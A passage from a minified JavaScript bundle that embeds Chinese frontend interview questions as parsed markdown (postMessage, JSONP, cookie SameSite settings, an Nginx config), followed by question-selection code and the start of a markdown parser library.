message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 跨文档消息传递（Cross-Document Messaging）:","text":" 跨文档消息传递（Cross-Document Messaging）:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。","text":"\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;示例：在页面 ","text":"\\n&emsp;示例：在页面 ","escaped":false},{"type":"codespan","raw":"`https://parent.com`","text":"https://parent.com"},{"type":"text","raw":" 中有一个 iframe 加载了 ","text":" 中有一个 iframe 加载了 ","escaped":false},{"type":"codespan","raw":"`https://child.com`","text":"https://child.com"},{"type":"text","raw":" 的页面。在 ","text":" 的页面。在 ","escaped":false},{"type":"codespan","raw":"`https://parent.com`","text":"https://parent.com"},{"type":"text","raw":" 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","text":" 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst iframe = document.getElementById(\'myIframe\');\\niframe.contentWindow.postMessage(\'这是一条消息\', \'https://child.com\');\\n```","lang":"js","text":"const iframe = document.getElementById(\'myIframe\');\\niframe.contentWindow.postMessage(\'这是一条消息\', \'https://child.com\');"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"<br/>\\n&emsp;在 `https://child.com` 页面中监听 message 事件来接收处理消息:\\n\\n","pre":false,"text":"<br/>\\n&emsp;在 `https://child.com` 页面中监听 message 事件来接收处理消息:\\n\\n"},{"type":"code","raw":"```js\\nwindow.addEventListener(\'message\', function(event) {\\n    if (event.origin === \'https://parent.com\') {\\n        console.log(\'收到来自父页面的消息：\', event.data);\\n        // 可以在这里根据消息内容进行相应操作\\n    }\\n});\\n```","lang":"js","text":"window.addEventListener(\'message\', function(event) {\\n    if (event.origin === \'https://parent.com\') {\\n        console.log(\'收到来自父页面的消息：\', event.data);\\n        // 可以在这里根据消息内容进行相应操作\\n    }\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","task":false,"loose":false,"text":"**1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","tokens":[{"type":"text","raw":"**1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","text":"**1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" JSONP（虽然存在安全隐患，但曾是一种跨域手段）:","text":" JSONP（虽然存在安全隐患，但曾是一种跨域手段）:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：JSONP 利用了 ","text":"\\n&emsp;原理：JSONP 利用了 ","escaped":false},{"type":"codespan","raw":"`<script>`","text":"<script>"},{"type":"text","raw":" 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 ","text":" 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 ","escaped":false},{"type":"codespan","raw":"`<script>`","text":"<script>"},{"type":"text","raw":" 标签时，就会执行这个函数从而获取到数据。","text":" 标签时，就会执行这个函数从而获取到数据。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;示例：前端页面需要从 ","text":"\\n&emsp;示例：前端页面需要从 ","escaped":false},{"type":"codespan","raw":"`https://api.example.com`","text":"https://api.example.com"},{"type":"text","raw":" 获取数据，在页面中可以这样写：","text":" 获取数据，在页面中可以这样写：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction handleData(data) {\\n    console.log(\'获取到的数据：\', data);\\n}\\n<script src=\\"https://api.example.com/getData?callback=handleData\\"><\/script>\\n//服务器端（https://api.example.com）接收到请求后，会将数据按照约定格式返回，例如返回类似 handleData({ \\"name\\": \\"张三\\", \\"age\\": 20 }) 的内容，浏览\\n// 器加载这个 <script> 时就会执行 handleData 函数并传入数据。不过，JSONP 的缺点是它没有对返回的数据做安全验证，容易遭受 XSS 攻击，所以现在正规场景下使用\\n// 较少，多被 CORS 等更安全的机制替代。\\n```","lang":"js","text":"function handleData(data) {\\n    console.log(\'获取到的数据：\', data);\\n}\\n<script src=\\"https://api.example.com/getData?callback=handleData\\"><\/script>\\n//服务器端（https://api.example.com）接收到请求后，会将数据按照约定格式返回，例如返回类似 handleData({ \\"name\\": \\"张三\\", \\"age\\": 20 }) 的内容，浏览\\n// 器加载这个 <script> 时就会执行 handleData 函数并传入数据。不过，JSONP 的缺点是它没有对返回的数据做安全验证，容易遭受 XSS 攻击，所以现在正规场景下使用\\n// 较少，多被 CORS 等更安全的机制替代。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","task":false,"loose":false,"text":"**2：** 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","tokens":[{"type":"text","raw":"**2：** 同源策略下的 Cookie 限制:<br/>\\n\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","text":"**2：** 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 同源策略下的 Cookie 限制:","text":" 同源策略下的 Cookie 限制:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。","text":"\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","text":"\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nhttp.createServer((req, res) => {\\n    res.writeHead(200, {\\n        \'Set-Cookie\': \'myCookie=value; Domain=.example.com; SameSite=Lax; Path=/\'\\n    });\\n    res.end(\'Cookie已设置\');\\n}).listen(3000);\\n//这样设置后，在符合 Lax 模式规则的跨子域名请求等场景下，Cookie 有可能会被发送，实现了在同源策略框架下一定程度的跨域相关 Cookie 管理和共享控制。\\n//这些安全机制在遵循同源策略的基础上，通过不同的方式来实现合理的跨域交互或者加强对跨域场景下信息交互的安全管控，保障 Web 应用的整体安全性。\\n```","lang":"js","text":"http.createServer((req, res) => {\\n    res.writeHead(200, {\\n        \'Set-Cookie\': \'myCookie=value; Domain=.example.com; SameSite=Lax; Path=/\'\\n    });\\n    res.end(\'Cookie已设置\');\\n}).listen(3000);\\n//这样设置后，在符合 Lax 模式规则的跨子域名请求等场景下，Cookie 有可能会被发送，实现了在同源策略框架下一定程度的跨域相关 Cookie 管理和共享控制。\\n//这些安全机制在遵循同源策略的基础上，通过不同的方式来实现合理的跨域交互或者加强对跨域场景下信息交互的安全管控，保障 Web 应用的整体安全性。"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]},{"key":"Nginx","content":"<h1>Nginx</h1>\\n<h2>基础配置</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<pre><code class=\\"language-conf\\"># Nginx 启动时创建的 worker 进程的数量\\nworker_processes  1;\\n\\n# 配置 Nginx 主进程的 PID 文件路径\\n#pid        logs/nginx.pid;\\n\\nevents {\\n    # 指定每个 worker 进程可以同时处理的最大连接数\\n    worker_connections  1024;\\n}\\n\\nhttp {\\n    include       mime.types;\\n    default_type  application/octet-stream;\\n\\n    # 提高文件传输的效率，特别是对于大文件来说\\n    sendfile        on;\\n    # 用于减少网络传输中的数据包数量，通过将多个小数据包合并成一个大数据包来提高网络传输的效率\\n    tcp_nopush     on;\\n\\n    # 指定了空闲连接的超时时间，即客户端和服务器之间保持连接的最长时间\\n    # 在这里，连接在 65 秒内没有任何活动就会被关闭。通过调整此值，您可以控制服务器上空闲连接的数量，以及资源的有效利用程度\\n    keepalive_timeout  65;\\n\\n    # 启用 HTTP 响应的压缩功能，以减少传输的数据量，提高网络传输效率\\n    gzip  on;\\n\\n    server {\\n        # 端口\\n        listen       8099;\\n        server_name  localhost;\\n        \\n        location / {\\n            root html-vue;\\n            # hash 路由的重定向\\n            try_files $uri $uri/ /index.html;\\n            index index.html;\\n            # 跨域\\n            add_header &#39;Access-Control-Allow-Origin&#39; &#39;*&#39;;\\n            # 允许跨域请求的方法包括 GET、POST 和 OPTIONS\\n            add_header &#39;Access-Control-Allow-Methods&#39; &#39;GET, POST, OPTIONS&#39;;\\n            # 允许跨域请求携带的自定义请求头\\n            add_header &#39;Access-Control-Allow-Headers&#39; &#39;DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type&#39;;\\n            \\n            # 确保浏览器在使用缓存前必须与服务器确认资源是否被修改过\\n            if ($request_filename ~* ^.*?.(html|htm|js)$) {\\n              add_header Cache-Control no-cache;\\n            }\\n        }\\n\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理 - 作用是不在 vue 项目中写死 ip\\n        # 这样配置后，再也不用给前端里面写固定的 ip\\n        location /data {\\n            # 删除 url 中的 /data 但是目前貌似不生效\\n            # rewrite ^/data/(.*)$ /$1 break;\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n\\n    # 基础访问\\n    server {\\n        listen       80;\\n        server_name  localhost;\\n\\n        location / {\\n            root   html;\\n            index  index.html index.htm;\\n        }\\n        # 错误页面\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理\\n        location /data {\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n}\\n</code></pre>\\n</details>","ast":[{"type":"space","raw":"\\n"},{"type":"heading","raw":"# Nginx\\n\\n","depth":1,"text":"Nginx","tokens":[{"type":"text","raw":"Nginx","text":"Nginx","escaped":false}]},{"type":"heading","raw":"## 基础配置\\n\\n","depth":2,"text":"基础配置","tokens":[{"type":"text","raw":"基础配置","text":"基础配置","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"code","raw":"```conf\\n# Nginx 启动时创建的 worker 进程的数量\\nworker_processes  1;\\n\\n# 配置 Nginx 主进程的 PID 文件路径\\n#pid        logs/nginx.pid;\\n\\nevents {\\n    # 指定每个 worker 进程可以同时处理的最大连接数\\n    worker_connections  1024;\\n}\\n\\nhttp {\\n    include       mime.types;\\n    default_type  application/octet-stream;\\n\\n    # 提高文件传输的效率，特别是对于大文件来说\\n    sendfile        on;\\n    # 用于减少网络传输中的数据包数量，通过将多个小数据包合并成一个大数据包来提高网络传输的效率\\n    tcp_nopush     on;\\n\\n    # 指定了空闲连接的超时时间，即客户端和服务器之间保持连接的最长时间\\n    # 在这里，连接在 65 秒内没有任何活动就会被关闭。通过调整此值，您可以控制服务器上空闲连接的数量，以及资源的有效利用程度\\n    keepalive_timeout  65;\\n\\n    # 启用 HTTP 响应的压缩功能，以减少传输的数据量，提高网络传输效率\\n    gzip  on;\\n\\n    server {\\n        # 端口\\n        listen       8099;\\n        server_name  localhost;\\n        \\n        location / {\\n            root html-vue;\\n            # hash 路由的重定向\\n            try_files $uri $uri/ /index.html;\\n            index index.html;\\n            # 跨域\\n            add_header \'Access-Control-Allow-Origin\' \'*\';\\n            # 允许跨域请求的方法包括 GET、POST 和 OPTIONS\\n            add_header \'Access-Control-Allow-Methods\' \'GET, POST, OPTIONS\';\\n            # 允许跨域请求携带的自定义请求头\\n            add_header \'Access-Control-Allow-Headers\' \'DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type\';\\n            \\n            # 确保浏览器在使用缓存前必须与服务器确认资源是否被修改过\\n            if ($request_filename ~* ^.*?.(html|htm|js)$) {\\n              add_header Cache-Control no-cache;\\n            }\\n        }\\n\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理 - 作用是不在 vue 项目中写死 ip\\n        # 这样配置后，再也不用给前端里面写固定的 ip\\n        location /data {\\n            # 删除 url 中的 /data 但是目前貌似不生效\\n            # rewrite ^/data/(.*)$ /$1 break;\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n\\n    # 基础访问\\n    server {\\n        listen       80;\\n        server_name  localhost;\\n\\n        location / {\\n            root   html;\\n            index  index.html index.htm;\\n        }\\n        # 错误页面\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理\\n        location /data {\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n}\\n```","lang":"conf","text":"# Nginx 启动时创建的 worker 进程的数量\\nworker_processes  1;\\n\\n# 配置 Nginx 主进程的 PID 文件路径\\n#pid        logs/nginx.pid;\\n\\nevents {\\n    # 指定每个 worker 进程可以同时处理的最大连接数\\n    worker_connections  1024;\\n}\\n\\nhttp {\\n    include       mime.types;\\n    default_type  application/octet-stream;\\n\\n    # 提高文件传输的效率，特别是对于大文件来说\\n    sendfile        on;\\n    # 用于减少网络传输中的数据包数量，通过将多个小数据包合并成一个大数据包来提高网络传输的效率\\n    tcp_nopush     on;\\n\\n    # 指定了空闲连接的超时时间，即客户端和服务器之间保持连接的最长时间\\n    # 在这里，连接在 65 秒内没有任何活动就会被关闭。通过调整此值，您可以控制服务器上空闲连接的数量，以及资源的有效利用程度\\n    keepalive_timeout  65;\\n\\n    # 启用 HTTP 响应的压缩功能，以减少传输的数据量，提高网络传输效率\\n    gzip  on;\\n\\n    server {\\n        # 端口\\n        listen       8099;\\n        server_name  localhost;\\n        \\n        location / {\\n            root html-vue;\\n            # hash 路由的重定向\\n            try_files $uri $uri/ /index.html;\\n            index index.html;\\n            # 跨域\\n            add_header \'Access-Control-Allow-Origin\' \'*\';\\n            # 允许跨域请求的方法包括 GET、POST 和 OPTIONS\\n            add_header \'Access-Control-Allow-Methods\' \'GET, POST, OPTIONS\';\\n            # 允许跨域请求携带的自定义请求头\\n            add_header \'Access-Control-Allow-Headers\' \'DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type\';\\n            \\n            # 确保浏览器在使用缓存前必须与服务器确认资源是否被修改过\\n            if ($request_filename ~* ^.*?.(html|htm|js)$) {\\n              add_header Cache-Control no-cache;\\n            }\\n        }\\n\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理 - 作用是不在 vue 项目中写死 ip\\n        # 这样配置后，再也不用给前端里面写固定的 ip\\n        location /data {\\n            # 删除 url 中的 /data 但是目前貌似不生效\\n            # rewrite ^/data/(.*)$ /$1 break;\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n\\n    # 基础访问\\n    server {\\n        listen       80;\\n        server_name  localhost;\\n\\n        location / {\\n            root   html;\\n            index  index.html index.htm;\\n        }\\n        # 错误页面\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理\\n        location /data {\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]}]');let Pe=null;const Kn={初级:{基础:.6,编程:.3,业务:.1,架构:0,管理:0,拓展:0},中级:{基础:.2,编程:.6,业务:.1,架构:.1,管理:0,拓展:0},高级:{基础:.1,编程:.2,业务:.5,架构:.1,管理:0,拓展:.1},架构:{基础:.1,编程:.1,业务:.1,架构:.5,管理:.1,拓展:.1},专家:{基础:.1,编程:.1,业务:.1,架构:.3,管理:.2,拓展:.2}},Gp=e=>{const t=e.ast,n=[];let a=null,s=0;return t.forEach(r=>{if(r.type==="heading"&&r.depth===2)a&&n.push({...a,score:s}),a={title:r.text,type:"",score:0,text:""},s=0;else if(r.type==="heading"&&r.depth===4){if(r.text.startsWith("类型："))a.type=r.text.replace("类型：","").trim().replace(/^`(.*)`$/,"$1");else if(r.text.startsWith("解答（")){const o=r.text.match(/解答\s*（\s*(\d+)\s*分\s*）/i);o&&(s=parseInt(o[1],10))}}else a&&r.type!=="heading"&&(a.text+=r.raw)}),a&&n.push({...a,score:s}),n},Ai=(e,t)=>{const n=Kn[t]||Kn.初级,a=e.reduce((o,p)=>(o[p.type]||(o[p.type]=[]),o[p.type].push(p),o),{}),s=[];let r=0;for(;r<100;)for(const o in n){const p=a[o]||[],l=n[o],i=Math.ceil(l*100);for(let d=0;d<i;d++){if(p.length===0)continue;const f=Math.floor(Math.random()*p.length),y=p.splice(f,1)[0];if(r+y.score<=100&&(s.push(y),r+=y.score),r>=100)break}if(r>=100)break}for(;r<100;){const o=e.filter(i=>!s.includes(i)),p=Math.floor(Math.random()*o.length),l=o[p];r+l.score<=100&&(s.push(l),r+=l.score)}return s},Li=()=>(Pe!=null&&Pe.length||(Pe=Xp.map(e=>Gp(e)).flat().filter(e=>e.text)),Pe);function fn(){return{async:!1,breaks:!1,extensions:null,gfm:!0,hooks:null,pedantic:!1,renderer:null,silent:!1,tokenizer:null,walkTokens:null}}let be=fn();function Za(e){be=e}const Je={exec:()=>null};function O(e,t=""){let n=typeof e=="string"?e:e.source;const a={replace:(s,r)=>{let o=typeof r=="string"?r:r.source;return o=o.replace($.caret,"$1"),n=n.replace(s,o),a},getRegex:()=>new RegExp(n,t)};return a}const $={codeRemoveIndent:/^(?: {1,4}| {0,3}\t)/gm,outputLinkReplace:/\\([\[\]])/g,indentCodeCompensation:/^(\s+)(?:```)/,beginningSpace:/^\s+/,endingHash:/#$/,startingSpaceChar:/^ /,endingSpaceChar:/ $/,nonSpaceChar:/[^ ]/,newLineCharGlobal:/\n/g,tabCharGlobal:/\t/g,multipleSpaceGlobal:/\s+/g,blankLine:/^[ \t]*$/,doubleBlankLine:/\n[ \t]*\n[ \t]*$/,blockquoteStart:/^ {0,3}>/,blockquoteSetextReplace:/\n {0,3}((?:=+|-+) *)(?=\n|$)/g,blockquoteSetextReplace2:/^ {0,3}>[ \t]?/gm,listReplaceTabs:/^\t+/,listReplaceNesting:/^ {1,4}(?=( {4})*[^ ])/g,listIsTask:/^\[[ xX]\] /,listReplaceTask:/^\[[ xX]\] +/,anyLine:/\n.*\n/,hrefBrackets:/^<(.*)>$/,tableDelimiter:/[:|]/,tableAlignChars:/^\||\| *$/g,tableRowBlankLine:/\n[ \t]*$/,tableAlignRight:/^ *-+: *$/,tableAlignCenter:/^ *:-+: *$/,tableAlignLeft:/^ *:-+ *$/,startATag:/^<a 